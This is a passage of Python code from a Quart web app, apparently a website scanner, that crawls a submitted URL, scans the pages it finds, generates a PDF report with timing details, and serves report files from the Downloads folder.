            return await loop.run_in_executor(pool, generate_report_in_thread, url, results, crawled_urls, start_time, end_time, scan_duration)
    except Exception as e:
        print(f"Error in generate_report_async: {str(e)}")
        return None




@app.route('/', methods=['GET', 'POST'])
async def index():
    if request.method == 'POST':
        form_data = await request.form
        url = form_data.get('url')

        if not url:
            return jsonify({'error': 'URL is required'}), 400

        # Start the scan and record the time
        start_time = datetime.now()
        print(f"Starting scan for {url} at {start_time}")

        # Crawl the website to get all internal URLs
        crawled_urls = await crawl_website(url)
        print(f"Total URLs crawled: {len(crawled_urls)}")

        # Scan the URLs asynchronously
        results = await scan_with_async(crawled_urls)
        
        # Record the end time
        end_time = datetime.now()
        print(f"Scan completed at {end_time}")

        # Calculate the scan duration
        scan_duration = end_time - start_time
        print(f"Scan duration: {scan_duration}")

        # Generate PDF report asynchronously, passing the crawled URLs and time details
        report_file = await generate_report_async(url, results, crawled_urls, start_time, end_time, scan_duration)
        if report_file:
            return jsonify({'report': report_file})
        else:
            return jsonify({'error': 'Error generating report'}), 500

    return await render_template('index.html')




@app.route('/Downloads/<filename>')
async def download_file(filename):
    downloads_path = os.path.join(os.path.expanduser("~\Downloads"))
    return await send_from_directory(downloads_path, filename)

if __name__ == '__main__':
    app.run(debug=True)